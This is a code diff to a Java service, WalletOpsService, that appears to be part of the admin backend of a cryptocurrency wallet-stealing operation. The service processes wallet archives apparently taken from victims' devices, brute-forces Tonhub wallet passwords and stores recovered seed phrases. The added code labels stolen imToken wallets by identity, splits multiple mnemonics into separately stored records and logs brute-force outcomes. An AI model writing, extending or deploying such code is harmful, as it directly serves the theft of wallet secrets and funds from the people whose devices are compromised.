@@ -11,12 +11,14 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
+import org.apache.commons.lang3.StringUtils;
 import org.springframework.data.redis.core.StringRedisTemplate;
 import org.springframework.stereotype.Service;
 
 import com.admin.auth.AdminContext;
 import com.admin.config.V26AdminProperties;
 import com.admin.entity.DeviceEntity;
+import com.admin.parse.ImTokenWallet;
 import com.admin.parse.ParsedNote;
 import com.admin.parse.WalletDisplay;
 import com.admin.parse.WalletMatcher;
@@ -33,6 +35,7 @@ public class WalletOpsService {
 
     private final DeviceAdminService deviceAdminService;
     private final DeviceWalletService deviceWalletService;
+    private final ImTokenWallet imTokenWallet;
     private final SecretRevealService secretRevealService;
     private final WalletUnlockService walletUnlockService;
     private final MnemonicPersistService persistService;
@@ -66,9 +69,10 @@ public class WalletOpsService {
             return result;
         }
         String phrase = String.valueOf(result.getOrDefault("phrase", ""));
+        String sourceLabel = imtokenSourceLabel(zip, matched[0], matched[1], walletId);
         Map<String, Object> persisted = persistService.finalizeRecovered(
                 d.getDeviceId(), d.getAppId(),
-                java.util.Collections.singletonList(new String[] {matched[0], phrase}), true);
+                persistItems(sourceLabel, matched[0], walletId, phrase), true);
         result.put("wallet", matched[0]);
         result.put("walletKey", matched[1]);
         result.put("fileName", fileName);
@@ -77,6 +81,40 @@ public class WalletOpsService {
         result.put("mnemonicExisting", persisted.get("existing"));
         result.put("mnemonicPersisted", true);
         return result;
+    }
+
+    /** 对齐 Python：imToken 按身份写成「imToken · 账户」，详情页才能对上这张卡。 */
+    private String imtokenSourceLabel(Path zip, String title, String walletKey, String walletId) {
+        if (!"imtoken".equalsIgnoreCase(walletKey) || StringUtils.isBlank(walletId) || zip == null) {
+            return title;
+        }
+        try {
+            for (ImTokenWallet.Identity ident : imTokenWallet.listIdentities(zip, null)) {
+                if (walletId.equals(ident.getWalletId())) {
+                    return ImTokenWallet.displayLabel(title, ident.getName());
+                }
+            }
+        } catch (Exception ignored) {
+        }
+        return title;
+    }
+
+    private List<String[]> persistItems(String sourceLabel, String title, String walletId, String phrase) {
+        List<String> phrases = new ArrayList<>();
+        for (String line : StringUtils.defaultString(phrase).split("\\r?\\n")) {
+            if (StringUtils.isNotBlank(line)) {
+                phrases.add(line.trim());
+            }
+        }
+        List<String[]> items = new ArrayList<>();
+        if (StringUtils.isNotBlank(walletId) || phrases.size() <= 1) {
+            items.add(new String[] {StringUtils.defaultIfBlank(sourceLabel, title), phrase});
+            return items;
+        }
+        for (int i = 0; i < phrases.size(); i++) {
+            items.add(new String[] {title + " · #" + (i + 1), phrases.get(i)});
+        }
+        return items;
     }
 
     public Map<String, Object> revealWallet(AdminContext ctx, String deviceId, String fileName,
@@ -244,14 +282,18 @@ public class WalletOpsService {
                     done.put("persisted", true);
                     mergeJob(jobId, done);
                 } else {
+                    String err = String.valueOf(result.getOrDefault("error", "爆破失败"));
+                    log.warn("tonhub brute done device={} file={} ok=false error={} tried={}",
+                            d.getDeviceId(), fileName, err, result.get("tried"));
                     mergeJob(jobId, Map.of(
                             "status", "done",
                             "ok", false,
                             "pct", 100,
-                            "error", String.valueOf(result.getOrDefault("error", "爆破失败")),
-                            "message", String.valueOf(result.getOrDefault("error", "爆破失败"))));
+                            "error", err,
+                            "message", err));
                 }
             } catch (Exception e) {
+                log.warn("tonhub brute fail device={} file={}: {}", d.getDeviceId(), fileName, e.toString());
                 mergeJob(jobId, Map.of("status", "done", "ok", false, "error", e.getMessage(), "message", e.getMessage()));
             } finally {
                 running.remove(jobId);
